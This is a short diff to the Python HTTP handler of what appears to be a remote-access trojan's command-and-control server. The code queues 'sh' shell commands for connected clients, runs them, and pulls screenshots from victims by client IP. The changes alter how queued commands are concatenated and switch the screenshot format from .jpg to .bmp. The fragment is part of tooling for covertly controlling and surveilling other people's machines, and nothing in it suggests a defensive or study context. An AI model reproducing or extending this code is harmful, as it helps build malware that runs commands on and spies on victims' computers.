@@ -114,10 +114,10 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
             if not element.startswith(b'sh '):
                 queue.appendleft(element)
                 break
+
+            command += element.split(b' ')[1] + b";"
             if not queue:
                 break
-
-            command += element + b";"
             element = queue.popleft()
 
         return command[:-1]
@@ -219,7 +219,7 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
 
             if command:
                 if command == b'screenshot':
-                    FILE_NAME_LIST[client_ip].append(datetime.now().strftime('%Y%m%d-%H%M%S') + '.jpg')
+                    FILE_NAME_LIST[client_ip].append(datetime.now().strftime('%Y%m%d-%H%M%S') + '.bmp')
                     self._ftp_request(command)
                 else:
                     self._command_execute_response(command)
@@ -293,7 +293,7 @@ try:
 
     http_server_thread = threading.Thread(target=httpd.serve_forever)
     http_server_thread.daemon = True
-    http_server_thread.start()
+    http_server_thread.start()  
 except Exception as e:
     print('[!] HTTP Server Open Error / {}'.format(str(e)))
     exit(0)
